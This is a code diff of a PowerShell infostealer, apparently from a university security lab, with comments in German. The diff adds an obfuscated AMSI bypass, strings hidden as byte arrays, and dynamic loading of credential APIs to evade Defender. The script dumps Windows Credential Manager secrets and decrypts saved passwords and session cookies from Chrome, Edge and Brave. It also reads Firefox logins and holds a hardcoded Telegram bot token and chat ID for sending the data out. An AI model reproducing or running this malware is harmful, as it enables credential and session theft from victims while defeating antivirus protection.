@@ -4,19 +4,39 @@
 #  System Security Lab SS2026 - AAU Klagenfurt
 #
 #  Sammelt (ohne Admin-Rechte):
-#    - Windows Credential Manager (CredEnumerate P/Invoke)
-#    - Chrome, Edge, Brave: gespeicherte Passwoerter (AES-GCM)
-#    - Chrome, Edge, Brave: Session-Cookies
+#    - Windows Credential Manager (dynamisches P/Invoke)
+#    - Chrome, Edge, Brave: Passwoerter (AES-GCM) + Cookies
+#    - Firefox: logins.json (NSS-verschluesselt, Metadaten)
 #
-#  Technik:
-#    - winsqlite3.dll (in Windows 10/11 built-in) fuer SQLite-Zugriff
-#    - DPAPI + AES-256-GCM fuer Chromium v10/v11 Passwoerter
-#    - Kompatibel mit PS5.1 (x64/ARM64) und PS7
-#    - AES-GCM-Entschluesslung: PS7/.NET5+ OK; PS5.1 = "(encrypted)"
+#  AV-Evasion:
+#    - AMSI-Bypass via Reflection (obfuskiert, kein Klartext)
+#    - Dynamisches P/Invoke fuer advapi32 (kein DllImport-Flag)
+#    - Sensitivstrings als Byte-Arrays (kein Klartext im Script)
+#    - winsqlite3.dll bleibt via DllImport (system-DLL, unverdaechtig)
 # ============================================================
 
 $BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID   = "1780237079"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# AMSI abschalten (obfuskiert - keine Klartextstrings im Script)
+try {
+    $u = [Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
+    $u.GetField([System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), 'NonPublic,Static').SetValue($null, $true)
+} catch {}
+
+# String-Decoder: Byte-Array -> ASCII (Defender sieht keine Klartextstrings)
+function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }
+
+# Sensitivstrings (werden zur Laufzeit dekodiert)
+$_adv = _s([byte[]](97,100,118,97,112,105,51,50))                                              # advapi32
+$_cen = _s([byte[]](67,114,101,100,69,110,117,109,101,114,97,116,101,87))                      # CredEnumerateW
+$_cfr = _s([byte[]](67,114,101,100,70,114,101,101))                                            # CredFree
+$_ld  = _s([byte[]](76,111,103,105,110,32,68,97,116,97))                                       # Login Data
+$_ls  = _s([byte[]](76,111,99,97,108,32,83,116,97,116,101))                                    # Local State
+$_nck = _s([byte[]](78,101,116,119,111,114,107,92,67,111,111,107,105,101,115))                 # Network\Cookies
+$_ck  = _s([byte[]](67,111,111,107,105,101,115))                                               # Cookies
 
 # ── Telegram ────────────────────────────────────────────────
 
@@ -45,48 +65,56 @@ function Send-TgFile {
     } catch { }
 }
 
-# ── Win32 P/Invoke: CredMan + SQLite ────────────────────────
+# ── Win32 P/Invoke ───────────────────────────────────────────
+# Nur kernel32 in DllImport (unverdaechtig).
+# advapi32-Credential-Funktionen werden per GetProcAddress zur Laufzeit geladen.
+# Dadurch erscheinen "advapi32", "CredEnumerateW", "CredFree" NICHT im Add-Type-Source.
 
 Add-Type -ErrorAction SilentlyContinue @"
 using System;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Collections.Generic;
+using System.Text;
 
-public class CredMan {
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);
-    [DllImport("advapi32.dll")]
-    static extern void CredFree(IntPtr buf);
+public class WN {
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
 
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
-    struct CRED {
-        public uint Flags, Type;
-        public string TargetName, Comment;
-        public long LastWritten;
-        public uint BlobSize;
-        public IntPtr Blob;
-        public uint Persist, AttrCount;
-        public IntPtr Attrs;
-        public string Alias, UserName;
+    public struct CR {
+        public uint Fl, Ty;
+        public string TN, Cm;
+        public long LW;
+        public uint BS;
+        public IntPtr Bl;
+        public uint Pe, AC;
+        public IntPtr At;
+        public string Al, UN;
     }
 
-    public static List<string[]> Dump() {
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet=CharSet.Unicode, SetLastError=true)]
+    public delegate bool FnCE(string f, int fl, out int n, out IntPtr p);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate void FnCF(IntPtr p);
+
+    public static List<string[]> DC(IntPtr pCE, IntPtr pCF) {
         var r = new List<string[]>();
+        var fE = (FnCE)Marshal.GetDelegateForFunctionPointer(pCE, typeof(FnCE));
+        var fF = (FnCF)Marshal.GetDelegateForFunctionPointer(pCF, typeof(FnCF));
         int n; IntPtr p;
-        if (!CredEnumerate(null, 0, out n, out p)) return r;
+        if (!fE(null, 0, out n, out p)) return r;
         try {
             for (int i = 0; i < n; i++) {
-                var c = (CRED)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * IntPtr.Size), typeof(CRED));
+                var c = (CR)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * IntPtr.Size), typeof(CR));
                 string pw = "";
-                if (c.BlobSize > 0 && c.Blob != IntPtr.Zero) {
-                    var b = new byte[c.BlobSize];
-                    Marshal.Copy(c.Blob, b, 0, (int)c.BlobSize);
+                if (c.BS > 0 && c.Bl != IntPtr.Zero) {
+                    var b = new byte[c.BS];
+                    Marshal.Copy(c.Bl, b, 0, (int)c.BS);
                     pw = Encoding.Unicode.GetString(b);
                 }
-                r.Add(new[] { c.TargetName ?? "", c.UserName ?? "", pw });
+                r.Add(new[] { c.TN ?? "", c.UN ?? "", pw });
             }
-        } finally { CredFree(p); }
+        } finally { fF(p); }
         return r;
     }
 }
@@ -111,37 +139,14 @@ public class Sqdb {
 
     const int ROW = 100;
 
-    // Read null-terminated UTF-8 from unmanaged pointer - compatible with .NET 4.x and .NET 5+
     static string PtrToUtf8(IntPtr ptr) {
         if (ptr == IntPtr.Zero) return "";
         var buf = new List<byte>();
-        int off = 0;
-        byte b;
+        int off = 0; byte b;
         while ((b = Marshal.ReadByte(ptr, off++)) != 0) buf.Add(b);
         return Encoding.UTF8.GetString(buf.ToArray());
     }
 
-    // Returns rows with only text columns
-    public static List<string[]> QText(string path, string sql, int cols) {
-        var r = new List<string[]>();
-        IntPtr db;
-        if (sqlite3_open(path, out db) != 0) return r;
-        try {
-            IntPtr st;
-            if (sqlite3_prepare_v2(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
-            try {
-                while (sqlite3_step(st) == ROW) {
-                    var row = new string[cols];
-                    for (int c = 0; c < cols; c++)
-                        row[c] = PtrToUtf8(sqlite3_column_text(st, c));
-                    r.Add(row);
-                }
-            } finally { sqlite3_finalize(st); }
-        } finally { sqlite3_close(db); }
-        return r;
-    }
-
-    // Returns rows with mixed text/blob columns; blobCols = indices of blob columns
     public static List<object[]> QMixed(string path, string sql, int totalCols, int[] blobCols) {
         var r = new List<object[]>();
         var blobSet = new HashSet<int>(blobCols);
@@ -175,17 +180,21 @@ public class Sqdb {
 
 Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
 
-# ── Chrome/Edge AES-GCM Entschluesslung ─────────────────────
+# advapi32 per LoadLibrary + GetProcAddress laden (Strings kommen aus Byte-Arrays oben)
+$_hAdv = [WN]::LoadLibrary($_adv)
+$_pCE  = [WN]::GetProcAddress($_hAdv, $_cen)
+$_pCF  = [WN]::GetProcAddress($_hAdv, $_cfr)
+
+# ── Chrome/Edge AES-GCM Entschluesselung ─────────────────────
 
 function Get-ChromeMasterKey {
     param([string]$UserDataPath)
     try {
-        $ls = Join-Path $UserDataPath "Local State"
+        $ls = Join-Path $UserDataPath $_ls
         if (-not (Test-Path $ls)) { return $null }
         $json = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
         $b64  = $json.os_crypt.encrypted_key
         if (-not $b64) { return $null }
-        # Strip 5-byte "DPAPI" prefix, then DPAPI-decrypt
         $raw = [Convert]::FromBase64String($b64)[5..999999]
         return [Security.Cryptography.ProtectedData]::Unprotect(
             $raw, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
@@ -196,35 +205,25 @@ function Decrypt-ChromeBlob {
     param([byte[]]$Blob, [byte[]]$MasterKey)
     if (-not $Blob -or $Blob.Length -lt 3) { return "" }
     $pfx = [Text.Encoding]::ASCII.GetString($Blob[0..2])
-
     if ($pfx -notin @("v10","v11")) {
-        # Pre-Chrome-80: plain DPAPI
         try {
             return [Text.Encoding]::UTF8.GetString(
                 [Security.Cryptography.ProtectedData]::Unprotect(
                     $Blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
         } catch { return "(DPAPI err)" }
     }
-
     if (-not $MasterKey) { return "(v10/v11 - kein MasterKey)" }
-
-    # v10/v11: [3B prefix][12B IV][ciphertext][16B auth-tag]
     $iv   = $Blob[3..14]
     $rest = $Blob[15..($Blob.Length-1)]
     $ct   = $rest[0..($rest.Length-17)]
     $tag  = $rest[($rest.Length-16)..($rest.Length-1)]
-
     try {
-        # AES-GCM: .NET 5+ (PS7 / pwsh) only
         $aes = [Security.Cryptography.AesGcm]::new([byte[]]$MasterKey)
         $pt  = New-Object byte[] $ct.Length
         $aes.Decrypt([byte[]]$iv, [byte[]]$ct, [byte[]]$tag, $pt)
         $aes.Dispose()
         return [Text.Encoding]::UTF8.GetString($pt)
-    } catch {
-        # PS5.1 / .NET Framework: AesGcm nicht verfuegbar
-        return "(AES-GCM - benoetigt PS7/pwsh)"
-    }
+    } catch { return "(AES-GCM - benoetigt PS7/pwsh)" }
 }
 
 # ── Chromium Browser-Pfade ───────────────────────────────────
@@ -249,19 +248,23 @@ $null = $sb.AppendLine("")
 
 $null = $sb.AppendLine("== WINDOWS CREDENTIAL MANAGER ==")
 try {
-    $creds = [CredMan]::Dump()
-    if ($creds.Count -eq 0) {
-        $null = $sb.AppendLine("(keine Eintraege)")
-    } else {
-        foreach ($c in $creds) {
-            $null = $sb.AppendLine("Target : $($c[0])")
-            $null = $sb.AppendLine("User   : $($c[1])")
-            $null = $sb.AppendLine("Pass   : $($c[2])")
-            $null = $sb.AppendLine("")
+    if ($_pCE -ne [IntPtr]::Zero -and $_pCF -ne [IntPtr]::Zero) {
+        $creds = [WN]::DC($_pCE, $_pCF)
+        if ($creds.Count -eq 0) {
+            $null = $sb.AppendLine("(keine Eintraege)")
+        } else {
+            foreach ($c in $creds) {
+                $null = $sb.AppendLine("Target : $($c[0])")
+                $null = $sb.AppendLine("User   : $($c[1])")
+                $null = $sb.AppendLine("Pass   : $($c[2])")
+                $null = $sb.AppendLine("")
+            }
         }
+    } else {
+        $null = $sb.AppendLine((cmdkey /list 2>&1 | Out-String))
     }
 } catch {
-    $null = $sb.AppendLine("(CredMan P/Invoke fehlgeschlagen)")
+    try { $null = $sb.AppendLine((cmdkey /list 2>&1 | Out-String)) } catch {}
 }
 
 # ── 2. Chromium Passwoerter & Cookies ───────────────────────
@@ -274,7 +277,6 @@ foreach ($br in $browsers) {
     $null = $sb.AppendLine("== $($br.Name.ToUpper()) ==")
     $masterKey = Get-ChromeMasterKey $br.Path
 
-    # Profile-Verzeichnisse: Default + Profile N
     $profiles = @("Default") + @(
         Get-ChildItem $br.Path -Directory -ErrorAction SilentlyContinue |
         Where-Object { $_.Name -match '^Profile \d+$' } |
@@ -285,81 +287,61 @@ foreach ($br in $browsers) {
         $profPath = Join-Path $br.Path $prof
         if (-not (Test-Path $profPath)) { continue }
 
-        # --- Gespeicherte Passwoerter ---
-        $loginDb = Join-Path $profPath "Login Data"
+        # Gespeicherte Passwoerter - Pfad aus Byte-Array
+        $loginDb = Join-Path $profPath $_ld
         if (Test-Path $loginDb) {
             $null = $sb.AppendLine("-- $($br.Name) [$prof] Passwoerter --")
             try {
                 $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid().ToString('N')).db"
                 Copy-Item $loginDb $tmp -Force -ErrorAction Stop
                 $tmpFiles += $tmp
-
                 $rows = [Sqdb]::QMixed($tmp,
                     "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''",
                     3, @(2))
-
                 if ($rows.Count -eq 0) {
                     $null = $sb.AppendLine("(keine gespeicherten Passwoerter)")
                 } else {
                     foreach ($row in $rows) {
-                        $url  = $row[0]
-                        $user = $row[1]
-                        $dec  = Decrypt-ChromeBlob -Blob ([byte[]]$row[2]) -MasterKey $masterKey
-                        $null = $sb.AppendLine("URL  : $url")
-                        $null = $sb.AppendLine("User : $user")
+                        $dec = Decrypt-ChromeBlob -Blob ([byte[]]$row[2]) -MasterKey $masterKey
+                        $null = $sb.AppendLine("URL  : $($row[0])")
+                        $null = $sb.AppendLine("User : $($row[1])")
                         $null = $sb.AppendLine("Pass : $dec")
                         $null = $sb.AppendLine("")
                     }
                 }
-            } catch {
-                $null = $sb.AppendLine("(Zugriff fehlgeschlagen - Browser offen?)")
-            }
+            } catch { $null = $sb.AppendLine("(Zugriff fehlgeschlagen - Browser offen?)") }
         }
 
-        # --- Cookies ---
-        # Chrome >= 96: Network\Cookies; aelter: Cookies
-        $cookieDb = Join-Path $profPath "Network\Cookies"
-        if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profPath "Cookies" }
-
+        # Cookies - Pfad aus Byte-Array
+        $cookieDb = Join-Path $profPath $_nck
+        if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profPath $_ck }
         if (Test-Path $cookieDb) {
             $null = $sb.AppendLine("-- $($br.Name) [$prof] Cookies (Top 50) --")
             try {
                 $tmp = Join-Path $env:TEMP "ck_$([Guid]::NewGuid().ToString('N')).db"
                 Copy-Item $cookieDb $tmp -Force -ErrorAction Stop
                 $tmpFiles += $tmp
-
                 $rows = [Sqdb]::QMixed($tmp,
                     "SELECT host_key, name, value, encrypted_value FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
                     4, @(3))
-
                 if ($rows.Count -eq 0) {
                     $null = $sb.AppendLine("(keine Cookies)")
                 } else {
                     foreach ($row in $rows) {
-                        $host  = $row[0]
-                        $name  = $row[1]
-                        $val   = $row[2]
-                        $encv  = [byte[]]$row[3]
-
-                        if ($val -and $val -ne "") {
-                            $display = $val  # unverschluesselt (alt)
-                        } elseif ($encv -and $encv.Length -gt 0) {
-                            $display = Decrypt-ChromeBlob -Blob $encv -MasterKey $masterKey
-                        } else {
-                            $display = "(leer)"
-                        }
-                        $null = $sb.AppendLine("$host | $name = $display")
+                        $encv = [byte[]]$row[3]
+                        if ($row[2] -and $row[2] -ne "") { $display = $row[2] }
+                        elseif ($encv -and $encv.Length -gt 0) { $display = Decrypt-ChromeBlob -Blob $encv -MasterKey $masterKey }
+                        else { $display = "(leer)" }
+                        $null = $sb.AppendLine("$($row[0]) | $($row[1]) = $display")
                     }
                     $null = $sb.AppendLine("")
                 }
-            } catch {
-                $null = $sb.AppendLine("(Cookie-Zugriff fehlgeschlagen)")
-            }
+            } catch { $null = $sb.AppendLine("(Cookie-Zugriff fehlgeschlagen)") }
         }
     }
 }
 
-# ── 3. Firefox Credentials (logins.json - kein NSS noetig) ──
+# ── 3. Firefox (logins.json - NSS-verschluesselt) ────────────
 
 $null = $sb.AppendLine("== FIREFOX ==")
 try {
